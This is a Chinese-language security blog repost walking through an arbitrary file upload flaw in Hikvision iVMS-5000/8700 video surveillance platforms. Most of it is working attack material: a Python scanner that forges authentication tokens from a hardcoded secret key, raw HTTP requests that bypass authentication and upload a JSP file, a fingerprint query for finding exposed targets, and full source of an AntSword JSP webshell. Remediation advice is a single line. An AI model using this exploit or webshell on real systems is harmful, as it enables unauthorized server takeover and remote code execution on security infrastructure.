#  海康威视iVMS综合安防系统任意文件上传漏洞复现   
 黑白之道   2024-03-16 08:22  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif "")  
### 0x01 产品简介  
  
海康威视iVMS集中监控应用管理平台，是以安全防范业务应用为导向，以视频图像应用为基础手段，综合视频监控、联网报警、智能分析、运维管理等多种安全防范应用系统，构建的多业务应用综合管理平台。  
  
**0x02 漏洞概述**  
  
海康威视iVMS系统存在在野 0day 漏洞，攻击者通过获取密钥任意构造token，请求/resourceOperations/upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。  
## 0x03 影响范围  
  
海康威视综合安防系统iVMS-5000  
  
海康威视综合安防系统 iVMS-8700  
## 0x04 复现环境  
  
鹰图指纹：web.body="/views/home/file/installPackage.rar"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic9RXHic0ZhwdKfic0Eicgg31PucL2icdPKx9OicmDga1vz2NQerHyELw9vocQ/640?wx_fmt=png&from=appmsg&wxfrom=13 "")  
## 0x05 漏洞复现   
  
检测脚本PoC:https://github.com/sccmdaveli/hikvision-poc  
```
import requests
import urllib3
import urllib
import hashlib
import argparse
from colorama import init
from colorama import Fore
init(autoreset=True)
urllib3.disable_warnings()


head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Cookie": "ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169"
}
def md5encode(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/uploadsecretKeyIbuilding"
    else:
        path = "/eps/api/resourceOperations/uploadsecretKeyIbuilding"
    encodetext = url + path
    input_name = hashlib.md5()
    input_name.update(encodetext.encode("utf-8"))
    return (input_name.hexdigest()).upper()

def poc(url):
    if url.endswith("/"):
        path = "eps/api/resourceOperations/upload?token="
    else:
        path = "/eps/api/resourceOperations/upload?token="
    pocurl = url + path + md5encode(url)
    data = {
        "service": urllib.parse.quote(url + "/home/index.action")
    }
    try:
        response = requests.post(url=pocurl,headers=head,data=data,verify=False,timeout=3)
        if response.status_code==200:
            print(Fore.GREEN + f"[+]{url}存在海康威视iVMS 综合安防任意文件上传漏洞！！！！")
        else:
            print(Fore.RED + f"[-]{url}不存在海康威视iVMS 综合安防任意文件上传漏洞")
    except:
        pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(usage='python3 ivms.py -u http://xxxx\npython3 ivms.py -f file.txt',
                                     description='ivms漏洞检测poc',
                                     )
    p = parser.add_argument_group('ivms 的参数')
    p.add_argument("-u", "--url", type=str, help="测试单条url")
    p.add_argument("-f", "--file", type=str, help="测试多个url文件")
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    if args.file:
        for i in open(args.file,"r").read().split("\n"):
            poc(i)
```  
  
**使用方式：**  
  
单个url检测：  
```
python3 ivms-poc.py -u url
```  
  
多个url检测:  
```
python3 ivms-poc.py -f file.txt


```  
  
效果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic9LzmnJO5uPFia32pzDD7BbsMew5Gz33Xy78zZpBdiaEp256Ga0G0VrhyQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**手动复现**  
  
漏洞url:/eps/api/resourceOperations/upload  
  
bp抓取首页包，尝试访问接口（发现token需要进行鉴权）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic943YiclKKJJBN4CRSgK6rEDjs5qvKZunxibu5LroT2L3Cwe4x5j8NuJag/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
POST /eps/api/resourceOperations/upload HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://you-ip
Connection: close
Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9
Upgrade-Insecure-Requests: 1
Content-Length: 62

service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action
```  
  
构造token绕过认证  （内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）  
  
secretkey是代码里写死的（默认值：secretKeyIbuilding）  
  
token值需要进行MD5加密（32位大写）  
  
组合：token=MD5(url+"secretKeyIbuilding")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic9SrZcFFfQmyeV9oSFEgUhAsFfV6yFPuzEr9Gb5Gtw5SibnweFljlVT2w/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
重新验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic9pXMJtz6aXHYliar5TebqJH9RrianrA5CLuUhldTkQdUbbt7zF8VmPbfA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
可以看到，成功绕过  
  
构造文件上传payload  
```
POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
Upgrade-Insecure-Requests: 1
Content-Length: 174

------WebKitFormBoundaryGEJwiloiPo
Content-Disposition: form-data; name="fileUploader";filename="1.jsp"
Content-Type: image/jpeg

test
------WebKitFormBoundaryGEJwiloiPo
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic9TyXmtNty2wl3hFwrOILHHuUNKQBnCBE2b1micuUXgV8TM20fxjJAMgw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
显示上传成功且返回了resourceUuid值  
  
验证路径：http://url/eps/upload/resourceUuid的值.jsp  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic95ibIdyefJ8nJGicIcTDaJwsxzqgiccvQs3dFv4rwg3I0MywJ6JYggF7ZQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 0x06 漏洞利用  
  
直接上传蚁剑jsp马子  
```
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic9atDm19Pl8AzaovMxObwpialcbDItugpJmop4YEuiaAO89G48F9lQyt3A/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
上传成功，尝试连接  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/GzdTGmQpRic1RyCJ6ibic6EZtyhdSnntWic98xktr9EoOrS6ibURshCWX1OzmiaTLJlCX7b0UOZKdb7xucaia9Y9ibgvOw/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
## 0x07 修复建议  
  
关闭互联网暴露面访问的权限，文件上传模块做好权限强认证。  
> 原文链接：https://blog.csdn.net/qq_41904294/article/details/130807691  
  
原文作者：OidBoy_G  
  
  
  
  
黑白之道发布、转载的文章中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途及盈利等目的，否则后果自行承担！  
  
如侵权请私聊我们删文  
  
  
**END**  
  
  
